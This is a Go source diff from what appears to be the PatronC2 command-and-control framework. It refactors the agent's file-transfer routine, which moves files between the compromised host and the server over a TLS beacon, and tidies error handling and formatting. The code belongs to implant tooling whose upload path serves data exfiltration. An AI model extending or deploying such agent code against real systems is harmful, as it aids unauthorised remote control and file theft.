@@ -7,8 +7,8 @@ import (
 	"os"
 	"path/filepath"
 
-	"github.com/PatronC2/Patron/types"
 	"github.com/PatronC2/Patron/lib/logger"
+	"github.com/PatronC2/Patron/types"
 )
 
 func HandleFileRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
@@ -30,8 +30,8 @@ func HandleFileRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Deco
 					logger.Logf(logger.Info, "Downloading file to %v", fileResponse.Path)
 					err := downloadHandler(fileResponse)
 					if err != nil {
-						return fmt.Errorf("Failed to download file")
-						err = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
+						_ = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
+						return fmt.Errorf("failed to download file , %s", err)
 					}
 					success = "Success"
 					err = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
@@ -43,16 +43,16 @@ func HandleFileRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Deco
 					logger.Logf(logger.Info, "Uploading %v to server", fileResponse.Path)
 					err := uploadHandler(fileResponse, encoder, decoder)
 					if err != nil {
-						logger.Logf(logger.Error, "Error sending file: %v", err)
-						err = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
+						_ = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
+						return fmt.Errorf("failed to send file , %s", err)
 					}
 				} else {
 					logger.Logf(logger.Info, "No more files to process")
 					goto Exit
-				}	
+				}
 			} else {
 				return fmt.Errorf("unexpected payload type for FileResponse")
-			}			
+			}
 		} else {
 			return fmt.Errorf("unexpected response type: %v, expected FileResponseType", response.Type)
 		}
@@ -124,14 +124,13 @@ func uploadHandler(fileResponse types.FileResponse, encoder *gob.Encoder, decode
 
 func createFileToServerRequest(fileID string, agentID string, transferType string, status string, chunk []byte) types.FileToServer {
 	return types.FileToServer{
-		FileID:    	fileID,
-		AgentID:	agentID,
-		Type:		transferType,
-		Status:		status,
-		Chunk:		chunk,
+		FileID:  fileID,
+		AgentID: agentID,
+		Type:    transferType,
+		Status:  status,
+		Chunk:   chunk,
 	}
 }
-
 
 func fileTransferSuccessHandler(fileID string, agentID string, transferType string, success string, encoder *gob.Encoder, decoder *gob.Decoder) error {
 	successReq := createSuccessRequest(fileID, agentID, transferType, success)
@@ -155,9 +154,9 @@ func fileTransferSuccessHandler(fileID string, agentID string, transferType stri
 
 func createSuccessRequest(fileID string, agentID string, transferType string, success string) types.FileToServer {
 	return types.FileToServer{
-		FileID:    	fileID,
-		AgentID:	agentID,
-		Type:		transferType,
-		Status:		success,
+		FileID:  fileID,
+		AgentID: agentID,
+		Type:    transferType,
+		Status:  success,
 	}
 }
